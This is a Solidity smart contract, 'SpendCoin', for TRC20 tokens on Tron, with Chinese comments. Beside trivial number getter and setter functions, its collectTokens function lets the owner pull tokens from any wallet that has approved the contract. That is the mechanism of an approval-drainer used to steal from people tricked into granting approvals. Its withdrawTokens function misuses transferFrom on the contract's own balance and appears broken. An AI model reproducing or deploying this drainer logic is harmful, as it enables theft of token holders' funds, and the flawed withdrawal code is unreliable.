// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITRC20 {
    //approve 授权，spender合约地址（或者是钱包地址）， amount授权额度
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    //approve 授权事件
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract SpendCoin {
    address public owner;

    uint256 number;

    constructor() {
        owner = msg.sender;
        number = 0;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not authorized");
        _;
    }

    // 提取授权的代币
    function collectTokens(address tokenAddress, address from, uint256 amount) external onlyOwner {
        ITRC20 token = ITRC20(tokenAddress);
        require(token.balanceOf(from) >= amount, "Insufficient balance");
        require(token.transferFrom(from, address(this), amount), "Transfer failed");
    }

    // 提取合约中的代币到管理员地址
    function withdrawTokens(address tokenAddress) external onlyOwner {
        ITRC20 token = ITRC20(tokenAddress);
        uint256 balance = token.balanceOf(address(this));
        require(balance > 0, "No tokens to withdraw");
        require(token.transferFrom(address(this), owner, balance), "Withdraw failed");
    }


    function setNumber(uint256 num) public {
        number = num;
    }

    function getNumber() public view returns(uint256) {
        return number;
    }

    function getNumberMul(uint256 num) public view returns(uint256) {
        return number * num;
    }

}